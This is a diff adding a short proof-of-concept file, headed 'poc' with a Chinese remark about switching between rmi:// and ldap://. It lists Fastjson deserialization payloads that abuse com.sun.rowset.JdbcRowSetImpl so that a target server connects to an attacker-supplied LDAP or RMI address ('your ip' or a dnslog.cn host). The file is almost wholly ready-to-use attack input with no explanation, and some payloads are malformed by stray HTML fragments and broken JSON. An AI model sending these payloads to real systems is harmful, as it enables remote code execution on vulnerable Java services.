@@ -1,0 +1,36 @@
+poc
+rmi://、ldap:// 可以切换尝试
+
+
+param={
+    "@type": "java.lang.Class",
+    br / > "a": {
+        "@type": "java.lang.Class",
+        "val": "com.sun.rowset.JdbcRowSetImpl"
+        "@type": "com.sun.rowset.JdbcRowSetImpl",
+        br / >
+    },
+    "b": {
+        "@type": "com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName": "ldap://your ip/",
+        "autoCommit": true
+    }
+}
+
+param={
+    "b":{
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"rmi://your ip/",
+        "autoCommit":true
+    }
+}
+
+param={"orderNo":"B200414195915053000","partnerOrderNo":"DC200414593341","x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://your ip/","autoCommit":true}}
+
+param={"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://your ip/","autoCommit":true}}}
+
+param={"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://9jo6zi.dnslog.cn","autoCommit":true}
+
+param={"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://your ip/","autoCommit":true}
+
+
